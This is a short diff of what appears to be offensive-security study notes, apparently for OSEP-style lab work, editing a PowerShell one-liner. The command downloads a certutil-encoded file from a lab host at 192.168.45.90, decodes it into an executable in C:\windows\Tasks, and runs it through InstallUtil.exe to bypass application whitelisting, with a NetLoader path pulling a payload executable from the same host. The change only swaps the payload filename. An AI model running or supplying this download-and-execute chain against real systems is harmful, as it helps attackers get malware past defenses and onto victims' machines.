@@ -51,7 +51,7 @@ Certutil -encode b.exe enc.txt
 
 
 ``` powershell
-powershell iwr -uri http://192.168.45.90:8080/enc.txt -outfile C:\\windows\\Tasks\\enc.txt;powershell rm C:\\windows\\Tasks\\proc.exe;powershell certutil -decode C:\\windows\\Tasks\\enc.txt C:\\windows\\Tasks\\proc.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.45.90:8080/apollo-local.exe /U C:\\windows\\Tasks\\proc.exe
+powershell iwr -uri http://192.168.45.90:8080/enc.txt -outfile C:\\windows\\Tasks\\enc.txt;powershell rm C:\\windows\\Tasks\\proc.exe;powershell certutil -decode C:\\windows\\Tasks\\enc.txt C:\\windows\\Tasks\\proc.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.45.90:8080/apollo-osep.exe /U C:\\windows\\Tasks\\proc.exe
 ```
 
-> note: the `/path=http://192.168.45.90:8080/apollo-local.exe` is for the  NetLoader only, TODO rest of parameters
+> note: the `/path=http://192.168.45.90:8080/apollo-osep.exe` is for the  NetLoader only, TODO rest of parameters
